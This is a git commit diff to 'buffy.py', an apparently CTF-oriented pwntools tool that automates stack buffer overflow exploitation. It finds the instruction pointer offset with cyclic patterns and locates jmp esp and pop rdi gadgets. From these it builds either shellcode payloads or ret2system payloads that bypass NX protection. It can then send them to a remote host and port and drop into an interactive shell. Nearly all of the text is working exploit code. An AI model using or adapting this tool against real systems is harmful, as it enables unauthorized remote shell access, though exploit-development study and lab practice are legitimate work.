f58953c86a60b8152ccfa932efd295b68779f458
isch1zo <42019491+isch1zo@users.noreply.github.com>
2022-02-05 22:55:25 +0300

    Update buffy.py

--- buffy.py
+++ buffy.py
@@ -1,8 +1,6 @@
 #!/usr/bin/python3
 from pwn import *
-import sys
-import optparse
-import ropper
+import sys,optparse,ropper
 
 def find_ip(payload, binary_arch):
     p = process(binary)
@@ -10,36 +8,35 @@ def find_ip(payload, binary_arch):
     p.sendline(payload)
     p.wait()
     esp_register = p.corefile.sp
+    libc_address = p.corefile.libc.address
     if binary_arch == "32bit":
         ip_offset = cyclic_find(p.corefile.pc)  # x86
     else:
         ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
+    return ip_offset,esp_register,libc_address
 
-    return ip_offset,esp_register
-
-def find_jmp(binary):
+def find_gadget(binary, gadget):
     try:
-        jmp_esp = ""
+        found_gadget = ""
         rs = ropper.RopperService()
         rs.addFile(binary)
         rs.loadGadgetsFor()
-        for file, gadget in rs.search(search='jmp ?sp'):
-            jmp_esp = gadget.address
+        for file, gadget in rs.search(search=gadget):
+            found_gadget = gadget.address
     except:
-        jmp_esp = ""
-    return jmp_esp
+        found_gadget = ""
+    return found_gadget
 
 def jmp_exploit(offset, esp_register, binary_arch, jmp_esp):
     try:
         info("offset : %#d ", offset)
         info("esp_register: %#x " ,esp_register)
         info("jmp esp/rsp: %#x", jmp_esp)
-
         payload = b"\x90"*offset
         if binary_arch == "32bit":
-            payload += p32(jmp_esp)  # x86
+            payload += p32(jmp_esp)
         else:
-            payload += p64(jmp_esp)  # x64
+            payload += p64(jmp_esp)
         payload += b"\x90"* 10
         payload += asm(shellcraft.sh())
 
@@ -67,66 +64,94 @@ def injection_exploit(offset, esp_register, binary_arch):
     except:
         error("you have to debug by your self, add -d or --debug argument")
 
-def remote_exploit(offset, esp_register, binary_arch, jmp_esp, host, port):
-    try:
-        p = remote(host,port)
-        payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
-        p.sendline(payload)
-        p.interactive()
+def ret2system(offset, binary, binary_arch, libc_address, libc_file):
+    try: 
+        libc = ELF(libc_file,checksec=False)
+        BINSH = next(libc.search(b"/bin/sh")) + libc_address
+        SYSTEM = libc.sym["system"] + libc_address
+        EXIT = libc.sym["exit"] + libc_address
+        info("libc address: %#x", libc_address)
+        info("system : %#x ", SYSTEM)
+        info("BINSH: %#x " ,BINSH)
+        info("EXIT: %#x " ,EXIT)
+        if binary_arch == "32bit":
+            payload = b"\x90"*offset + p32(SYSTEM) + p32(EXIT) + p32(BINSH)
+            return payload
+        else:
+            POP_RDI = find_gadget(binary,"pop rdi")
+            info("POP_RDI: %#x " ,POP_RDI)
+            payload = b"\x90"*offset + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
+            return payload
     except:
         error("you have to debug by your self, add -d or --debug argument")
-
-
-
+    
     
 if __name__ == '__main__':
-    parser = optparse.OptionParser()
-    parser.add_option("-r", "--remote", dest="remote", help="Remote flag to exploit remotely, example: -r [HOST] [PORT]", nargs=2)
-    parser.add_option("-d", "--debug", dest="debug", help="Debug flag to attach gdb, and pwntools debug mode", action="store_true")
-    parser.add_option("-p", "--pattern", dest="pattern", default=500, help="Enter number of pattern offset (Optional)")
-    (options, arguments) = parser.parse_args()
-
-    # Binary filename
-    binary = str(sys.argv[1])
-
-    # Architecture of file
-    binary_arch = platform.architecture(executable=binary)[0].strip()
-    success("  ------------------------------------------------")
-    success("| Developed by Ahmed Alshammari, twitter: @5ch1zo |")
-    success("  ------------------------------------------------")
-    info("Executable architecture: %#s ",binary_arch)
-
-    # This will automatically get context arch, bits, os etc
-    elf = context.binary = ELF(binary, checksec=False)
-
-    # Change logging level to help with debugging (error/warning/info/debug)
-    context.log_level = 'info'
-
-    # Pass in pattern_size, get back EIP/RIP offset
-    pattern = int(options.pattern)
-    info("Trying crash the binary with %#d bytes",int(pattern))
-
-    find_ip_list = find_ip(cyclic(pattern), binary_arch)
-    offset = find_ip_list[0]
-    esp_register = find_ip_list[1]
-    
-    context.log_level = "info"
-    # Finding jmp esp gadget
-    jmp_esp = find_jmp(binary)
     try:
+        parser = optparse.OptionParser()
+        parser.add_option("-b", "--binary", dest="binary", help="Enter targeted binary file")
+        parser.add_option("-r", "--remote", dest="remote", help="Remote flag to exploit remotely, example: -r [HOST] [PORT]", nargs=2)
+        parser.add_option("-l", "--libc", dest="libc", help="Add libc file to get bypass NX protection")
+        parser.add_option("-d", "--debug", dest="debug", help="Debug flag to attach gdb, and pwntools debug mode", action="store_true")
+        parser.add_option("-p", "--pattern", dest="pattern", default=500, help="Enter number of pattern offset (Optional)")
+        (options, arguments) = parser.parse_args()
+
+        # Binary filename
+        binary = options.binary
+
+        # Architecture of file
+        binary_arch = platform.architecture(executable=binary)[0].strip()
+        success("  ------------------------------------------------")
+        success("| Developed by Ahmed Alshammari, twitter: @5ch1zo |")
+        success("  ------------------------------------------------")
+        info("Executable architecture: %#s ",binary_arch)
+
+        # This will automatically get context arch, bits, os etc
+        elf = context.binary = ELF(binary, checksec=False)
+
+        # Pass in pattern_size, get back EIP/RIP offset
+        pattern = int(options.pattern)
+        info("Trying crash the binary with %#d bytes",int(pattern))
+
+        find_ip_list = find_ip(cyclic(pattern), binary_arch)
+        offset = find_ip_list[0]
+        esp_register = find_ip_list[1]
+        libc_address = find_ip_list[2]
+        
+        # info("libc address: %#x", libc_address)
+        context.log_level = "info"
+        
+        # Finding jmp esp gadget
+        jmp_esp = find_gadget(binary,"jmp ?sp")
+        
+        # Check file's security and filter the result of NX protection
+        checksec = ELF(binary,checksec=False).checksec()
+        checksec = checksec[checksec.index("NX"):checksec.index("PIE")]
+
+
         # Remote Section
         if options.remote:
             host = options.remote[0]
             port = options.remote[1]
-            if jmp_esp:
-                remote_exploit(offset, esp_register, binary_arch, jmp_esp, host, port)
+            
+            p = remote(host,port)
+
+            if "enabled" in checksec:
+                payload = ret2system(offset, binary, binary_arch, libc_address, options.libc)
+            
             else:
-                error("we couldn't find jmp esp/rsp gadget to exploit remotely!!")
+                if jmp_esp:
+                    payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
+                else:
+                    error("we couldn't find jmp esp/rsp gadget to exploit remotely!!")
+            p.sendline(payload)
+            p.interactive()
         
         # Local Section
         else:
             # Start program
             io = process(binary)
+            
             # Debug Section
             if options.debug:
                 context.log_level = 'debug'
@@ -136,11 +161,14 @@ if __name__ == '__main__':
                     gdb_commands += "b *"+str(hex(jmp_esp))
                 gdb.attach(io, gdb_commands)
 
-            # Find esp Section
-            if not jmp_esp:
-                payload = injection_exploit(offset, esp_register, binary_arch)
+            if "enabled" in checksec:
+                payload = ret2system(offset, binary, binary_arch, libc_address, options.libc)
             else:
-                payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
+                # Find esp Section
+                if jmp_esp:
+                    payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
+                else:
+                    payload = injection_exploit(offset, esp_register, binary_arch)
             
             # Send the payload
             io.sendline(payload)
